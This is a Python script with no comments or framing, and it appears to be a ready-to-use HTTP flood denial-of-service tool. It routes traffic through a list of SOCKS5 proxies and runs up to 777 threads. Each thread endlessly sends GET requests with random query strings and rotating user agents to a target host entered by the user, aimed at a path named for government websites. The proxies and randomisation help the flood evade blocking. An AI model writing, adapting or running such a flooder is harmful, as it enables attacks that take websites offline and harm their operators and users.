from random_user_agent.user_agent import UserAgent
import threading
import random
import logging
import socket
import socks
import sys
import ssl

logging.basicConfig(
	format="[%(asctime)s] %(message)s",
	datefmt="%H:%m:%S",
	level=logging.INFO
)

active_threads = 0
max_threads = 777

usera = UserAgent()
proxy_list = open("socks5_list.txt", "r")
proxies = proxy_list.readlines()

chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"
chars_list = chars

context = ssl.create_default_context()

def hflood(host, port, proxy_host, proxy_port, timeout=5, https=False):
	try:
		global active_threads
		active_threads += 1
		sock = socks.socksocket()
		sock.settimeout(timeout)
		sock.set_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
		sock.connect((host, port))
		if https:
			sock = context.wrap_socket(sock, server_hostname=host)
		while True:
			list_param = random.choices(chars_list, k=77)
			params = "".join(list_param)
			ua = usera.get_random_user_agent()
			http = f"GET /lists/government-websites/?{params} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\n\r\n"
			send = sock.send(http.encode())
			print(f"Sent {send} bytes of data")
			print(sock.recv(100))
	except Exception as e:
		logging.debug(f"hflood error: {e}")
		pass
	finally:
		active_threads -= 1

host = input("Host: ")
port = int(input("Port: "))

while True:
	for proxy in proxies:
		proxy = proxy.strip()
		proxy_host, proxy_port = proxy.split(":")
		while True:
			if active_threads >= max_threads:
				continue
			logging.debug(f"Starting thread with {proxy_host} proxy")
			threading.Thread(target=hflood, args=[host, port, proxy_host, proxy_port, 10], daemon=True).start()
			break
